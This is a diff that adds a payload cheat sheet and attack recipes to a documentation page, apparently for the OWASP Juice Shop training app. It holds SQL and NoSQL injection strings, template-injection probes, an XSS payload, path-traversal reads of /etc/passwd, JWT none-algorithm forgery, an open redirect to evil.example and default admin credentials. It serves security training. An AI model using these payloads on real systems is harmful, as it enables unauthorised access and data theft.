@@ -414,6 +414,28 @@ function docs(){
       <div class="k">negative qty</div><div>set basket item quantity to a negative int</div>
     </div>
 
+    <h3>PAYLOAD LIBRARY — EXTENDED</h3>
+    <div class="kv">
+      <div class="k">SQLi login (users)</div><div><code>admin@juice-sh.op'--</code> · <code>' UNION SELECT 1--</code></div>
+      <div class="k">SQLi order-by probe</div><div><code>?order=id)) ORDER BY 1--</code> (find column count)</div>
+      <div class="k">NoSQLi regex</div><div><code>{"email":{"$regex":".*"},"password":{"$gt":""}}</code></div>
+      <div class="k">SSTI (email/reviews)</div><div><code>#{7*7}</code> · <code>{{7*7}}</code> · <code>&lt;%= 7*7 %&gt;</code></div>
+      <div class="k">stored XSS (name)</div><div><code>&lt;img src=x onerror=alert(1)&gt;</code></div>
+      <div class="k">path traversal</div><div><code>../../../etc/passwd</code> · <code>..%2f..%2f..%2fetc%2fpasswd</code></div>
+      <div class="k">JWT none-alg</div><div>header <code>{"alg":"none","typ":"JWT"}</code>, drop signature</div>
+      <div class="k">open redirect</div><div><code>?to=https://evil.example</code> · <code>redirect?to=//evil.example</code></div>
+      <div class="k">default creds</div><div><code>admin@juice-sh.op</code> / <code>admin123</code> · <code>password</code></div>
+      <div class="k">deserialization</div><div>Node <code>_$$ND_FUNC$$_</code> gadget in a serialized field</div>
+    </div>
+
+    <h3>ATTACK RECIPES (per category)</h3>
+    <ul>
+      <li><b>Broken Access Control</b> — log in low-priv → capture a request → swap your id/BasketId/role → replay in Burp Repeater</li>
+      <li><b>Injection</b> — find a filter/search/order param → break the query with a quote → rebuild with <code>UNION SELECT</code> matching column count</li>
+      <li><b>Sensitive Data Exposure</b> — hit <code>/ftp</code>, <code>/support/logs</code>, source maps, and error stack traces before touching auth</li>
+      <li><b>Crypto</b> — decode every token/hash you see (jwt.io, CyberChef); weak = HS256 brute or MD5 crack</li>
+    </ul>
+
     <h3>JWT ATTACKS (the app runs on JWT)</h3>
     <ul>
       <li>grab the token from Local Storage → decode at <a href="https://jwt.io" target="_blank">jwt.io</a> (or <code>jwt_tool</code>)</li>
